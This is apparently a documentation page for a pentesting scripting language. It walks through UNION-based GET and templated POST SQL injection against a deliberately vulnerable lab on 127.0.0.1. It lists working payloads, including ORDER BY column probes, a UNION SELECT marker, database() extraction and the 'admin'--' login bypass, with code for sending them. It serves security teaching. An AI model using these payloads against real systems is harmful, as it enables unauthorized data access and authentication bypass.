# SQL injection walkthroughs

Pentest's HTTP builtins (`http_get`, `http_post`, `url_encode` — see
[builtins.md](builtins.md) and
[`SPEC.md`](../../SPEC.md#5118-network-builtins-http_get-http_post-url_encode-unreleased)
§5.11.8) make classic injection workflows plain `.pen` programs. Two worked
examples ship in the repo, and both run only against a deliberately
vulnerable **local** lab — every target stays on `127.0.0.1`:

```text
python3 examples/sqli_lab.py &            # serves http://127.0.0.1:8080
build/pentest run examples/sqli_union.pen # UNION-based GET SQLi
build/pentest run examples/sqli_post.pen  # raw-POST templating SQLi
```

`examples/sqli_lab.py` is a small Python `http.server` with string-formatted
SQL (vulnerable by design) and binds `127.0.0.1:8080` only. Endpoints:
`/item?id=…` (GET), plus `/login` and `/search` (POST).

Both examples share the same response handling, because `http_get` and
`http_post` return one `text` of the form `STATUS\nBODY`:

<!-- no-run -->
```python
parse_resp(r):
    nl = r.find("\n")
    return [int(r[0:nl]), r[nl + 1:]]   # [status:int, body:text]
```

A status of `0` means the request never reached a server — the body then
holds the curl error string.

## 1. UNION-based injection over GET — `examples/sqli_union.pen`

Flow against `/item?id=5`:

1. **Confirm injection and count columns** with `ORDER BY N`
   (`5' ORDER BY 1-- -`, …) until the response stops reporting a SQL error.
2. **Find the reflected column** with a `UNION SELECT` marker probe
   (`5' UNION SELECT P3NT3ST1,P3NT3ST2,…-- -`) and look for the marker in
   the body.
3. **Extract data** by reflecting `database()` (or `table_name`, …) at the
   reflected column.

Every payload is percent-encoded with `url_encode()` and sent with
`http_get(target + url_encode(payload))`, so one persistent keep-alive
connection carries the whole scan:

<!-- no-run -->
```python
get_payload(p):
    resp = http_get(target + url_encode(p))
    status, body = parse_resp(resp)
    return [status, body]
```

## 2. Raw-POST templating (Burp Repeater style) — `examples/sqli_post.pen`

Copy the captured POST request, mark the spots you will alter with `{{VAR}}`
placeholders, `url_encode()` the injected values, fix `Content-Length`, and
send the body with `http_post(url, body, headers)`. `headers` is a
newline-separated `Name: value` text — a caller `Content-Type` suppresses
the JSON default, so the request stays byte-identical to the captured one
except for the templated spots:

<!-- no-run -->
```python
headers = "Content-Type: application/x-www-form-urlencoded\nHost: 127.0.0.1:8080"
body = "username=" + url_encode(user) + "&password=" + url_encode(pw)
resp = http_post("http://127.0.0.1:8080/login", body, headers)
status, body = parse_resp(resp)
```

The example first tries the auth bypass `admin'--` on `/login`, then a
UNION probe on `/search`.

## Notes

- The targets in both examples are `http://127.0.0.1:8080/...` — edit the
  `target`/`url` line before pointing them at anything else.
- Arity is checked at compile time, with the exact messages
  `'http_get' expects 1 to 2 argument(s), got N`,
  `'http_post' expects 2 to 3 argument(s), got N` and
  `'url_encode' expects 1 argument(s), got N`.
